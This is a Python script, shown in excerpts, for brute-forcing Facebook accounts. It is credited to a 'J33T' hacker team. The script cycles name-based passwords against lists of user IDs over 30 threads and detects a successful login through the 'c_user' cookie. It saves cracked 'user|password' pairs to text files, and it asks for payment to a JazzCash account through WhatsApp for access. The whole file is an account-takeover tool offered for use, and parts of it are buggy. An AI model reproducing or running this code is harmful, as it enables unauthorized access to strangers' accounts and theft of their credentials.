...
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : Ꭻ33Ͳ ᎷϴΝᎠϴᏞ
 
\033[0;93mFACEBOOK : ՏϴΝᎪͲϴΝᏆ-ᎻᎪᏟᏦᎬᎡ-ᏴϴᎽՏ-ͲᎬᎪᎷ 
 
\033[0;96mGITHUB   : J33T-01
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mJ33T_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mJ33T_CP.txt' % (H, P, str(len(cp))))
...
def biki():
    ...
    print(' [3] EXIT ')
    print('')
    _biki___ = input(' [?] CHOOSE OPTION : ')
    if _biki___ in ('1', '01'):
        __xxx__().bikix(id)
    if _biki___ in ('2', '02'):
        os.system('python biki.py')
    if _biki___ in ('3', '03'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[J33T] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[J33T-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('J33T_CP.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[J33T-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('J33T_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Biki Mahamood Hacker
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rjazzcash Account Number 9957975493\n')
        print('\rAccount Name Biki Mahamood\n')
        print
        print
        ...
        os.system('am start https://wa.me/+919957975493?text=' + tks)
